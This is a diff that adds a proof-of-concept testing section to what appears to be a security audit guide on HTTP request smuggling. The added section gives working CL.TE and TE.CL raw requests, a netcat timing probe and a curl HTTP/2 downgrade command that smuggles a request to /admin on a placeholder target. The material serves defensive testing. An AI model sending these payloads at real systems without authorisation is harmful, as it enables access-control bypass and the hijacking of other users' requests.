@@ -41,6 +41,64 @@ Static analysis does not model CL.TE/TE.CL smuggling at the proxy layer. Manual 
 
 Commonly affected languages: JavaScript/Node.js only for parser-configuration checks. Java servlets, Python WSGI/ASGI, Go net/http, C#, Ruby, and nginx/Apache proxy configuration require deployment-audit review — smuggling at the proxy/backend boundary is outside typical static web query packs.
 
+## Dynamic Test / PoC
+
+Send raw HTTP over TCP (replace `TARGET`) or use netcat. Ambiguous CL+TE requests probe front/back-end parser disagreement.
+
+**CL.TE** (front honors Content-Length, back honors Transfer-Encoding):
+
+```http
+POST / HTTP/1.1
+Host: TARGET
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /404-proof HTTP/1.1
+X: x
+
+```
+
+If the *next* request to `/` returns the `/404-proof` body or status, desync is confirmed.
+
+**TE.CL** (front honors Transfer-Encoding, back honors Content-Length):
+
+```http
+POST / HTTP/1.1
+Host: TARGET
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+```
+
+**TE.TE obfuscation** — both layers accept TE but parse obfuscated values differently (e.g. `Transfer-Encoding: xchunked`, trailing whitespace, duplicate TE headers).
+
+**CL.CL** — dual `Content-Length` headers with different values; front and back may pick different lengths.
+
+**Timing probe** — back-end waiting for more chunked data often hangs:
+
+```bash
+printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\nX' | timeout 10 nc TARGET 80
+```
+
+Response delay or timeout versus a normal request suggests CL.TE desync.
+
+**HTTP/2 downgrade (H2.CL / H2.TE)** — HTTP/2 front translating to HTTP/1.1 back-end with conflicting length semantics:
+
+```bash
+curl --http2 https://TARGET/ \
+  -H "Content-Length: 0" \
+  -H "Transfer-Encoding: chunked" \
+  -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\n\r\n"
+```
+
+Confirm desync with a harmless smuggled probe path (e.g. `GET /404-proof`) before testing sensitive routes.
+
 ## Common False Alarms
 
 - Single-layer architecture: direct client-to-application with no proxy in between
